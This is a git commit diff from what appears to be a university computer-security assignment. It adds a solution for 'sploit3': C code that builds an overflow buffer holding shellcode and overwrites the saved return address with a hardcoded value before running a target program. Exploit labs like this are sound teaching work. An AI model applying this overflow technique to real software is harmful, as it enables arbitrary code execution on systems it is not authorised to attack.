d5f6cc3d18e33ccf57617e41952d9f1efa8b2a26
Haoen  Huang <huangh53@p89.ecf.utoronto.ca>
2018-01-24 15:01:26 -0500

    Added solution for sploit3

--- sploits/sploit3.c
+++ sploits/sploit3.c
@@ -13,7 +13,20 @@ main ( int argc, char * argv[] )
 	char *	env[1];
 
 	args[0] = TARGET;
-	args[1] = "hi there";
+	char exploit[73];
+	int i = 0;
+	for (i = 0; i < 72; i++) {
+		exploit[i] = 0x01;
+	}	
+	strcpy(exploit, shellcode);
+	for (i = 45; i < 72; i++) {
+		exploit[i] = 0x01;
+	}
+	exploit[72] = 0x00;
+	int return_add = 0x2021fe14;
+	int* exploit_ret_add = (int*) (exploit + 68);
+	*exploit_ret_add = return_add;
+	args[1] = exploit;
 	args[2] = NULL;
 
 	env[0] = NULL;
